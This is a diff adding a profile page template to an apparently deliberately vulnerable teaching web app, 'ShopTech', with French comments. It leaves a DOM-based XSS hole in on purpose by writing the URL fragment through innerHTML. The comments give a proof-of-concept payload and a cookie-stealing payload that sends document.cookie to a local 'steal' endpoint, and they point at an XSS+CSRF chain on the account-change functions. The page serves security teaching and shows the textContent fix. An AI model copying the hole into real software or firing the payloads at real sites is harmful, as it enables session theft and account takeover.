@@ -1,0 +1,159 @@
+{% extends "base.html" %}
+{% block title %}Profil — ShopTech{% endblock %}
+
+{% block content %}
+<div class="container py-4">
+  <div class="row g-4">
+
+    <!-- Informations du compte -->
+    <div class="col-md-4">
+      <div class="card border-0 shadow-sm">
+        <div class="card-body p-4 text-center">
+          <div class="mb-3" style="width:80px;height:80px;background:#0d6efd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto;">
+            <i class="bi bi-person-fill text-white" style="font-size:2rem;"></i>
+          </div>
+          <h4 class="fw-bold mb-0">{{ user }}</h4>
+          <p class="text-muted small">{{ email }}</p>
+          <hr>
+          <ul class="list-unstyled text-start">
+            <li class="mb-2"><i class="bi bi-person text-primary me-2"></i> Profil</li>
+            <li class="mb-2"><i class="bi bi-box-seam text-primary me-2"></i> Mes commandes</li>
+            <li class="mb-2"><i class="bi bi-heart text-primary me-2"></i> Favoris</li>
+            <li><i class="bi bi-gear text-primary me-2"></i> Paramètres</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Zone principale -->
+    <div class="col-md-8">
+
+      <!--
+        ════════════════════════════════════════════════════════════
+        VULN — DOM-based XSS (OWASP A03:2021)
+        Le fragment URL (#) est injecté via innerHTML sans sanitisation.
+        Particularité : le payload ne transite JAMAIS par le serveur.
+        → Logs serveur vierges, WAF contourné.
+
+        Payload PoC :
+          http://localhost:5000/profile#<img src=x onerror="alert('DOM XSS')">
+
+        Payload vol de cookie :
+          http://localhost:5000/profile#<img src=x onerror="new Image().src='http://localhost:8000/steal?c='+document.cookie+'&src=dom'">
+
+        DEFENSE : remplacer innerHTML par textContent (ligne 9 du script ci-dessous)
+        ════════════════════════════════════════════════════════════
+      -->
+
+      <!-- Zone d'affichage du message de bienvenue (cible du DOM XSS) -->
+      <div class="card border-0 shadow-sm mb-4">
+        <div class="card-body p-4">
+          <h5 class="fw-semibold mb-3">
+            Message personnalisé
+            <span class="badge bg-danger ms-2" style="font-size:.6rem; vertical-align:middle;">DOM XSS</span>
+          </h5>
+          <div id="profile-message" class="alert alert-info py-2">
+            Ajoutez <code>#votre_message</code> dans l'URL pour personnaliser cette zone.
+          </div>
+          <p class="text-muted small mb-0">
+            Exemple : <code>http://localhost:5000/profile#Bonjour%20{{ user }}%20!</code>
+          </p>
+        </div>
+      </div>
+
+      <!-- Paramètres du compte -->
+      <div class="card border-0 shadow-sm mb-4">
+        <div class="card-body p-4">
+          <h5 class="fw-semibold mb-3">Paramètres du compte</h5>
+          <div id="account-alert"></div>
+          <div class="mb-3">
+            <label class="form-label">Adresse email</label>
+            <div class="input-group">
+              <input type="email" id="new-email" class="form-control" value="{{ email }}">
+              <button class="btn btn-outline-primary" onclick="changeEmail()">Modifier</button>
+            </div>
+          </div>
+          <div class="mb-0">
+            <label class="form-label">Nouveau mot de passe</label>
+            <div class="input-group">
+              <input type="password" id="new-password" class="form-control" placeholder="Nouveau mot de passe">
+              <button class="btn btn-outline-danger" onclick="changePassword()">Modifier</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Info cookie pour la démo -->
+      <div class="card border-warning border-0 shadow-sm">
+        <div class="card-body p-4">
+          <h5 class="fw-semibold mb-3"><i class="bi bi-info-circle text-warning me-2"></i>Votre cookie de session</h5>
+          <p class="text-muted small mb-2">
+            En production, ce cookie devrait être <strong>HttpOnly</strong> (inaccessible depuis JavaScript).
+            Ici, il est délibérément lisible pour la démo :
+          </p>
+          <code id="cookie-display" class="d-block bg-light p-2 rounded small" style="word-break:break-all;"></code>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+// Afficher le cookie pour la démo
+document.getElementById('cookie-display').textContent =
+  document.cookie || '(aucun cookie lisible — HttpOnly activé)';
+
+// ════════════════════════════════════════════════════════════
+// VULN — DOM-based XSS
+// location.hash est injecté via innerHTML sans aucune sanitisation.
+// DEFENSE : remplacer innerHTML par textContent (ligne suivante, commentée)
+// ════════════════════════════════════════════════════════════
+window.addEventListener('DOMContentLoaded', function() {
+  const hash = location.hash.substring(1);
+  if (hash) {
+    const el = document.getElementById('profile-message');
+    el.innerHTML = decodeURIComponent(hash);         // VULN
+    // el.textContent = decodeURIComponent(hash);    // DEFENSE
+  }
+});
+
+// Modifier l'email (cible de la chaîne XSS+CSRF)
+function changeEmail() {
+  const email = document.getElementById('new-email').value;
+  fetch('/account/change-email', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email }),
+    credentials: 'include'
+  })
+  .then(r => r.json())
+  .then(data => {
+    const el = document.getElementById('account-alert');
+    if (data.success) {
+      el.innerHTML = '<div class="alert alert-success py-2 small">Email mis à jour : ' + data.email + '</div>';
+    }
+  });
+}
+
+// Modifier le mot de passe (cible de la chaîne XSS+CSRF)
+function changePassword() {
+  const password = document.getElementById('new-password').value;
+  fetch('/account/change-password', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ password }),
+    credentials: 'include'
+  })
+  .then(r => r.json())
+  .then(data => {
+    const el = document.getElementById('account-alert');
+    if (data.success) {
+      el.innerHTML = '<div class="alert alert-success py-2 small">Mot de passe mis à jour.</div>';
+    }
+  });
+}
+</script>
+{% endblock %}
